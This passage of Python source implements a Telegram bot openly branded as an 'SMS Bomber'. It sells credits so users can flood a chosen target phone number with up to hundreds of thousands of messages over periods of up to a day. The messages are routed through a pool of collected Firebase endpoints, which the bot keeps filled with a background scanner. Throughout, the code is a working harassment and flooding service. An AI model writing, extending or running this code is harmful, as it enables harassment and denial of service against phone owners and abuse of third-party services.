        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
    for fb_id, delta in api_usage_delta.items():
        d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
        d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
        d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
    k = str(uid)
    if k in d_final["users"]:
        d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
    d_final.setdefault("sms_history", {}).setdefault(k, []).append({
        "number": number, "message": message[:100],
        "timestamp": int(time.time()),
        "status": "completed" if not was_cancelled else "stopped"
    })
    save(d_final)
    
    duration = int(time.time() - start_time)
    log_activity(d_final, "sms_blast", uid, f"sent={sent_ok} fail={sent_fail} dur={duration}s")
    save(d_final)
    
    try:
        user_chat = await bot.get_chat(uid)
        u_name = user_chat.full_name or "Unknown"
        u_uname = f"@{user_chat.username}" if user_chat.username else "No"
    except:
        u_name = d_final.get("users", {}).get(str(uid), {}).get("name", "?")
        u_uname = "No"
    chan_log = (
        f"🚀 <b>SMS BLAST</b>\n\n"
        f"👤 {u_name}\n🆔 <code>{uid}</code>\n🌐 {u_uname}\n"
        f"📞 <code>{number}</code>\n💬 <code>{message[:80]}</code>\n"
        f"✅ Sent: <b>{sent_ok}</b>\n❌ Fail: <b>{sent_fail}</b>\n"
        f"📊 Req: <b>{count}</b>\n⏱ {fmt_duration(duration)}\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))
    
    icon = em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0 else em(EMOJI_WARNING, "⚠️") if sent_ok > 0 else em(EMOJI_CROSS, "❌")
    credit_text = ""
    if is_regular:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Used: <b>{sent_ok}</b> | Remaining: <b>{remaining}</b>"
    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User stopped!</b>" if was_cancelled else ""
    
    if is_owner(uid, load()):
        back = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back = [
            btn("sᴇɴᴅ ᴀɢᴀɪN", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")
        ]
    
    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Msg: <code>{message[:50]}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(api_usage_delta)}</b>\n"
            f"{em(EMOJI_GEAR, '⏱')} Time: <b>{fmt_duration(int(time.time() - start_time))}</b>"
            f"{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]),
            parse_mode="HTML"
        )
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
# ║  SEND FLOWS WITH DURATION (SS 1 COMPATIBLE)
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    if not GLOBAL_LIMITER.is_allowed(cq.from_user.id):
        await cq.answer("⚠️ Slow down!", show_alert=True)
        return
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/3')} — {sc('number')}</b>\n\n"
        f"Target number:\n<i>e.g. +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Protected number!</b>", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/3')} — {sc('message')}</b>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_count)
    d = load()
    uid = msg.from_user.id
    uc = get_user_credits(uid, d)
    devices = get_cached_devices() or await get_all_online_devices(d)
    
    text = (
        f"💣 <b>Ayush X Bomber V2</b>\n\n"
        f"⚡ Speed » 🚀 FAST\n"
        f"🔥 APIs » {len(devices)} Online\n"
        f"💲 Your Credits: {uc}\n\n"
        f"⏱ <b>STEP 3/3 — SELECT DURATION</b>\n\n"
        f"<i>How long should it blast? (runs continuously)</i>"
    )
    await msg.answer(text, reply_markup=duration_kb("user"), parse_mode="HTML")

@R.callback_query(F.data.startswith("user:dur:"))
async def user_duration_selected(cq: CallbackQuery, state: FSMContext):
    dur_type = cq.data.split("user:dur:", 1)[1]
    uid = cq.from_user.id
    d = load()
    
    # Map duration to count & costs approx based on SS 1
    duration_map = {
        "1m": (500, 500),
        "5m": (2000, 2000),
        "10m": (5000, 5000),
        "30m": (15000, 50000),
        "1h": (30000, 100000),
        "6h": (100000, 180000),
        "12h": (200000, 360000),
        "1d": (400000, 720000)
    }
    
    if dur_type == "custom":
        await state.set_state(S.send_custom_duration)
        await cq.message.edit_text(
            f"✍️ <b>Custom Time / Count</b>\n\nKitne SMS bhejne hain enter karein:",
            reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
            parse_mode="HTML"
        )
        return
        
    count, cost = duration_map.get(dur_type, (500, 500))
    fsmd = await state.get_data()
    await state.clear()
    
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "Ayush Bomber")
    speed = SPEED_FAST
    
    if not is_admin(uid, d) and not is_owner(uid, d):
        cur = get_user_credits(uid, d)
        if cur <= cost:
            # Adjust to max available credits
            cost = cur
            count = max(1, cur)
        if cur <= 0:
            await cq.message.edit_text(
                f"{em(EMOJI_CROSS, '❌')} <b>No credits!</b>\n\nBuy credits first.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML"
            )
            return
            
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await cq.message.edit_text(f"{em(EMOJI_WARNING, '😴')} No APIs online!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
        
    await cq.message.delete()
    await run_sms_blast_with_progress(cq.bot, cq.message, uid, number, message_text, count, devices, speed)

@R.message(S.send_custom_duration)
async def user_got_custom_duration(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    await state.clear()
    
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "Ayush Bomber")
    speed = SPEED_FAST
    
    if not is_admin(uid, d) and not is_owner(uid, d):
        cur = get_user_credits(uid, d)
        if cur <= 0:
            await msg.answer(f"{em(EMOJI_CROSS, '❌')} No credits!", parse_mode="HTML")
            return
        if count > cur:
            count = cur
            
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No APIs online!", parse_mode="HTML")
        return
        
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, speed)

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            await cq.answer("✅ Already done!", show_alert=True)
            return
        s.cancelled = True
    await cq.answer("🛑 Stopping...", show_alert=True)

# ═══════════════════════════════════════════════════════════════
# ║  TOP MANAGE VIDEO & VIDEO MANAGER
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:top_video:menu")
async def owner_top_video_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    top = d.get("top_video")
    text = f"{em(EMOJI_TOP, '⭐')} <b>Top Manage Video</b>\n\n"
    if top:
        text += (
            f"{em(EMOJI_CHECK, '✅')} <b>Active Top Video Set</b>\n\n"
            f"{em(EMOJI_VIDEO, '📹')} File ID: <code>{top['file_id'][:30]}...</code>\n"
            f"{em(EMOJI_STAR, '💬')} Caption:\n<pre>{(top.get('caption') or '')[:300]}</pre>\n\n"
            f"<i>Yeh video sabhi users ko /start par dikhega inline buttons ke sath.</i>"
        )
    else:
        text += (
            f"{em(EMOJI_CROSS, '❌')} <b>Koi top video set nahi hai.</b>\n\n"
            f"Set karne ke baad yeh video sabhi users ko /start par buttons ke sath dikhega."
        )
    await cq.message.edit_text(text, reply_markup=top_video_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:top_video:set")
async def owner_top_video_set(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_top_video)
    await cq.message.edit_text(
        f"{em(EMOJI_TOP, '⭐')} <b>Set Top Video</b>\n\n"
        f"Video bhejiye (ya URL/File ID).\n\n"
        f"<i>Video ke saath jo caption bhejenge wahi caption ayega.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:top_video:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_top_video)
async def owner_top_video_received(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    
    file_id = None
    caption = msg.caption or ""
    
    if msg.video:
        file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        file_id = msg.document.file_id
    elif msg.text and msg.text.strip().startswith(("http", "BAAD", "AgAD", "BQAC")):
        file_id = msg.text.strip()
    
    if not file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid video/URL/File ID bhejo!", parse_mode="HTML")
        return
    
    if not caption:
        caption = user_home_text(msg.from_user.id, d)
    
    d["top_video"] = {
        "file_id": file_id,
        "caption": caption,
        "set_by": msg.from_user.id,
        "set_at": int(time.time())
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Top Video Set Successfully!</b>",
        reply_markup=top_video_menu_kb(load()),
        parse_mode="HTML"
    )
    log_activity(d, "top_video_set", msg.from_user.id, f"set video")
    save(d)

@R.callback_query(F.data == "owner:top_video:remove")
async def owner_top_video_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["top_video"] = None
    save(d)
    await cq.answer("🗑 Top video removed!", show_alert=True)
    await owner_top_video_menu(cq, state)

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nVideo send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    file_id = None
    if msg.video:
        file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        file_id = msg.document.file_id
    elif msg.text:
        file_id = msg.text.strip()
    if not file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid video!", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Video added!",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All videos deleted!", show_alert=True)
    await owner_videos_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  FIREBASE MANAGER
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Bot-added: <b>{len(bot_fbs)}</b>\n"
        f"{em(EMOJI_GEAR, '📁')} Backup (firebase.txt): <b>{len(backup_fbs)}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Active: <b>{len(bot_fbs) + len(backup_fbs)}</b>",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\nFormat: <code>Label | URL</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label, url = parts[0].strip(), parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http!", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:reload_backup")
async def owner_fb_reload_backup(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    backup = load_backup_firebases()
    d["backup_firebases"] = backup
    save(d)
    await cq.answer(f"✅ Reloaded {len(backup)} firebases!", show_alert=True)
    await owner_fb_menu(cq, state)

@R.callback_query(F.data == "owner:fb:clear_backup")
async def owner_fb_clear_backup(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["backup_firebases"] = []
    d["_backup_mtime"] = 0
    save(d)
    await cq.answer("🗑 Backup cleared!", show_alert=True)
    await owner_fb_menu(cq, state)

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fb_id = cq.data.split("owner:fb:del:", 1)[1]
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    await cq.answer("🗑 Removed!")
    await owner_fb_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  BROADCAST & REDEEM
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nContent bhejiye:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = list(d.get("users", {}).keys())
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} No users!", parse_mode="HTML")
        return
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b>...", parse_mode="HTML")
    ok = fail = 0
    for uid_str in users:
        try:
            await msg.copy_to(int(uid_str))
            ok += 1
        except:
            fail += 1
        await asyncio.sleep(0.04)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await wait.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\nDelivered: {ok}\nFailed: {fail}",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna code enter karein:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    data = codes[code]
    is_vip = data.get("type") == "vip"
    if not is_vip and data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Code expired!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    credits = data["credits"]
    add_credits(uid, credits, d)
    if not is_vip:
        data["uses_left"] = data.get("uses_left", 1) - 1
    data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeemed Successfully!</b>\n\n+{credits} Credits",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════
# ║  SETTINGS, BUY, STATS & DAILY SPIN
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:buy_menu")
async def user_buy_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans available!", show_alert=True)
        return
    text = f"{em(EMOJI_MONEY, '🛒')} <b>Buy Credits</b>\n\n"
    for p in plans:
        text += f"{em(EMOJI_STAR, '📦')} <b>{p['name']}</b> — ₹{p['price']} = {p['credits']}c\n"
    rows = [[btn(f"{p['name']} — ₹{p['price']}", f"user:buy_plan:{p['id']}", EMOJI_MONEY, "🛒", style="success")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:dailyspin")
async def user_dailyspin(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    last_spin = udata.get("last_spin", 0)
    now = time.time()
    if now - last_spin < 86400:
        left = int(86400 - (now - last_spin))
        await cq.answer(f"⏳ Daily spin available in {fmt_duration(left)}!", show_alert=True)
        return
    reward = random.choice([10, 25, 50, 100, 250])
    add_credits(uid, reward, d)
    udata["last_spin"] = now
    save(d)
    await cq.answer(f"🎰 Won {reward} Credits!", show_alert=True)

# ═══════════════════════════════════════════════════════════════
# ║  HOME NAVIGATION
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML")
        return
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    credits = get_user_credits(cq.from_user.id, d)
    await cq.answer(f"💰 Credits: {credits}\n👑 Owner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"🔗 https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    ud = d["users"].get(str(uid), {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{ud.get('credits', 0)}</b>\n"
        f"📤 Sent: <b>{ud.get('uses', 0)}</b>\n"
        f"📅 Joined: <b>{fmt_time(ud.get('joined_at', 0))}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    hist = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not hist:
        text = f"{em(EMOJI_GEAR, '📜')} <b>History</b>\n\n<i>Empty</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Last 10</b>\n"]
        for i, e in enumerate(reversed(hist), 1):
            lines.append(f"{i}. {fmt_time(e.get('timestamp', 0))} — {mask_number(e.get('number', '?'))} — {e.get('status')}")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>AYUSH SMS BOMBER {_VERSION}</b>\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_FIRE, '🔥')} Fast & reliable SMS service",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Still not joined!", show_alert=True)
        return
    await cq.answer("✅ Verified!", show_alert=True)
    await user_home(cq, state)

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ═══════════════════════════════════════════════════════════════
# ║  WEB APP & MAIN ENTRYPOINT
# ═══════════════════════════════════════════════════════════════
_BOT_INSTANCE: Optional[Bot] = None
_DP_INSTANCE: Optional[Dispatcher] = None

async def _web_health(request: web.Request) -> web.Response:
    return web.json_response({
        "status": "ok",
        "version": _VERSION,
        "time": datetime.now().isoformat(),
        "devices_online": len(CACHED_DEVICES),
        "active_sessions": len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()]),
    })

async def _web_webhook(request: web.Request) -> web.Response:
    try:
        if _BOT_INSTANCE is None or _DP_INSTANCE is None:
            return web.json_response({"error": "bot not ready"}, status=503)
        update_data = await request.json()
        from aiogram.types import Update
        update = Update.model_validate(update_data, context={"bot": _BOT_INSTANCE})
        await _DP_INSTANCE.feed_update(_BOT_INSTANCE, update)
        return web.json_response({"ok": True})
    except Exception as e:
        log.error(f"Webhook error: {e}")
        return web.json_response({"ok": False, "error": str(e)}, status=500)

async def _web_root(request: web.Request) -> web.Response:
    return web.Response(
        text=f"<h1>🚀 AYUSH SMS BOMBER {_VERSION}</h1><p>Bot is running!</p>",
        content_type="text/html"
    )

def build_web_app() -> web.Application:
    app = web.Application()
    app.router.add_get("/", _web_root)
    app.router.add_get("/health", _web_health)
    app.router.add_get("/healthz", _web_health)
    app.router.add_post(WEBHOOK_PATH, _web_webhook)
    return app

async def main():
    global _BOT_INSTANCE, _DP_INSTANCE
    from aiogram.client.default import DefaultBotProperties

    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    _BOT_INSTANCE = bot
    _DP_INSTANCE = dp

    me = await bot.get_me()
    log.info(f"✅ @{me.username} — {_VERSION} starting...")

    await get_http_session()
    
    try:
        backup = load_backup_firebases()
        if backup:
            d = load()
            d["backup_firebases"] = backup
            d["_backup_mtime"] = os.path.getmtime(_BACKUP_FIREBASE_FILE) if os.path.exists(_BACKUP_FIREBASE_FILE) else 0
            save(d)
    except Exception as e:
        log.warning(f"Backup firebase load failed: {e}")

    scanner_task = asyncio.create_task(background_firebase_scanner(bot))

    use_webhook = bool(WEBHOOK_URL and WEBHOOK_URL.startswith("https://"))

    if use_webhook:
        app = build_web_app()
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
        await site.start()
        webhook_full = WEBHOOK_URL.rstrip("/") + WEBHOOK_PATH
        try:
            await bot.delete_webhook(drop_pending_updates=True)
            await bot.set_webhook(
                webhook_full,
                allowed_updates=dp.resolve_used_update_types(),
                max_connections=100,
                drop_pending_updates=True,
            )
        except Exception as e:
            use_webhook = False

    if not use_webhook:
        try:
            await bot.delete_webhook(drop_pending_updates=True)
        except Exception:
            pass
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            drop_pending_updates=True,
            handle_signals=False,
        )

    if use_webhook:
        try:
            await asyncio.Event().wait()
